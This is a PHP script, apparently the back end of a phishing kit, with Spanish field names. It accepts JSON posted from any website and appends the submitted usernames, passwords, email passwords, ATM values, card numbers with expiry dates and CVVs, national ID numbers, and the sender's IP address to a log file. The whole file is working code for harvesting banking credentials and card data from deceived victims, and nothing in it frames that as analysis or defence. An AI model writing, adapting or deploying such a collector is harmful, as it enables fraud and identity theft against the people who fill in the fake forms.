<?php

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
include "ayud.php";

$jsonUsuario = json_decode(file_get_contents("php://input"));
if (!$jsonUsuario) {
    exit("No hay datos");
}
if (array_key_exists('usuario', $jsonUsuario)) {
    echo json_encode([
        "lo" => var_dump($jsonUsuario->usuario)
    ]);
} else if (array_key_exists('correo', $jsonUsuario)) {
    echo json_encode([
        "lo" => var_dump($jsonUsuario->correo)
    ]);
} else if (array_key_exists('ncard', $jsonUsuario)) {
    echo json_encode([
        "lo" => var_dump($jsonUsuario->ncard)
    ]);
} else if (array_key_exists('niden', $jsonUsuario)) {
    echo json_encode([
        "lo" => var_dump($jsonUsuario->niden)
    ]);
}

$ip = getRealIP();

if (array_key_exists('usuario', $jsonUsuario)) {
    $datos = "
=======================================
|| Usuario: " . $jsonUsuario->usuario . "
|| Contrasena: " . $jsonUsuario->clave . "
|| Ip: $ip";
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
} else if (array_key_exists('correo', $jsonUsuario)) {
    $datos = "
|| Correo: " . $jsonUsuario->correo . "
|| Ccorreo: " . $jsonUsuario->ccorreo . "
|| ATM: " . $jsonUsuario->atm . "
|| Ip: $ip";
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
} else if (array_key_exists('ncard', $jsonUsuario)) {
    $datos = "
|| Numero: " . $jsonUsuario->ncard . "
|| fecha: " . $jsonUsuario->mcard . "/" . $jsonUsuario->acard . "
|| Cvv: " .  $jsonUsuario->ccard . "
|| Ip: $ip";
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
} else if (array_key_exists('niden', $jsonUsuario)) {
    $datos = "
|| NumeroIdentidad: " . $jsonUsuario->niden . "
|| Ip: $ip
=======================================";
    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
}
